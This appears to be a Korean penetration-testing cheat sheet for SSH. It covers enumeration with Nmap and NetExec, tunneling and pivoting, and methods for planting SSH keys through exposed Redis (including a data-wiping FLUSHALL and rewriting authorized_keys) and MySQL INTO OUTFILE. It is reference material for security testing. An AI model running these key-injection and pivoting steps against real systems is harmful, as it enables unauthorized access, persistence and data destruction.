---
sidebar_position: 2
---

# SSH - 22

## 기본 정보

**포트**: 22 (기본)

## 기본 연결

```bash
# 기본 연결
ssh <USERNAME>@<RHOST>

# 포트 지정
ssh <USERNAME>@<RHOST> -p <PORT>

# Private Key 사용
ssh -i id_rsa <USERNAME>@<RHOST>

# 구식 알고리즘 사용 (오래된 서버용)
ssh <USERNAME>@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

## Private Key 수정

```bash
# 줄바꿈 문자 변환
dos2unix id_rsa

# Vim으로 정리
vim --clean id_rsa

# 권한 설정
chmod 600 id_rsa

# 한 줄로 실행
dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa
```

## Nmap

```bash
# 포트 스캔
sudo nmap -p22 -sV <RHOST>

# SSH NSE 스크립트 찾기
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep ssh

# SSH 호스트키 확인
sudo nmap -p22 --script ssh-hostkey <RHOST>

# SSH 인증 방법 확인
sudo nmap -p22 --script ssh-auth-methods <RHOST>

# 약한 암호화 알고리즘 확인
sudo nmap -p22 --script ssh2-enum-algos <RHOST>
```

## NetExec

```bash
# 명령 실행
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>

# 파일 다운로드
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file /PATH/TO/FOLDER/<FILE> <FILE>

# 파일 업로드
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> /PATH/TO/FOLDER/<FILE>
```

## SSH 터널링

### Local Port Forwarding

```bash
# 로컬 포트를 원격 서버로 포워딩
ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20

# 사용 예시
smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

### Dynamic Port Forwarding (SOCKS Proxy)

```bash
# SOCKS 프록시 생성
ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20

# proxychains 설정 (/etc/proxychains4.conf)
# socks5 192.168.50.10 9999

# 사용 예시
proxychains smbclient //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
proxychains nmap -vvv -sT --top-ports=20 -Pn -n <RHOST>
```

### Remote Port Forwarding

```bash
# 원격 서버의 포트를 로컬로 포워딩
ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10

# 사용 예시
psql -h 127.0.0.1 -p 2345 -U postgres
```

### Remote Dynamic Port Forwarding

```bash
# 원격 SOCKS 프록시
ssh -N -R 9998 <USERNAME>@192.168.50.10

# proxychains 설정
# socks5 127.0.0.1 9998

# 포트 확인
sudo ss -tulpn
```

## sshuttle

```bash
# VPN over SSH
sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24

# 사용 예시
smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
```

## Windows SSH (ssh.exe)

```bash
# Windows에서 SSH 위치 확인
where ssh
# C:\Windows\System32\OpenSSH\ssh.exe

# Windows에서 Remote Dynamic Port Forwarding
C:\Windows\System32\OpenSSH\ssh.exe -N -R 9998 <USERNAME>@192.168.50.10
```

## SSH Key 삽입

### Redis를 통한 SSH Key 삽입

```bash
# Redis CLI 연결
redis-cli -h <RHOST>

# 기존 데이터 삭제
echo "FLUSHALL" | redis-cli -h <RHOST>

# SSH 공개키 준비
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/spub.txt

# Redis에 키 저장
cat /tmp/spub.txt | redis-cli -h <RHOST> -x set s-key

# authorized_keys로 저장
redis-cli -h <RHOST>
> get s-key
> CONFIG GET dir
> CONFIG SET dir /var/lib/redis/.ssh
> CONFIG SET dbfilename authorized_keys
> save
```

### MySQL을 통한 SSH Key 삽입

```sql
-- authorized_keys2 파일에 키 작성
SELECT "<SSH_PUBLIC_KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' 
FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

## SSH 서버 시작

```bash
# SSH 서비스 시작
sudo systemctl start ssh
sudo systemctl enable ssh

# SSH 서비스 상태 확인
sudo systemctl status ssh

# 포트 확인
sudo ss -tulpn | grep :22
```

## 설정 파일

```bash
# SSH 클라이언트 설정
/etc/ssh/ssh_config
~/.ssh/config

# SSH 서버 설정
/etc/ssh/sshd_config

# Known hosts
~/.ssh/known_hosts

# Authorized keys
~/.ssh/authorized_keys
~/.ssh/authorized_keys2
```

## 로그 파일

```bash
# SSH 로그
/var/log/auth.log          # Debian/Ubuntu
/var/log/secure            # RHEL/CentOS

# SSH 연결 로그 확인
grep sshd /var/log/auth.log
journalctl -u ssh
```

## 참고

- Private Key 권한: 600
- Authorized Keys 권한: 644
- .ssh 디렉토리 권한: 700
- 구식 알고리즘 지원 확인
- PasswordAuthentication 설정 확인
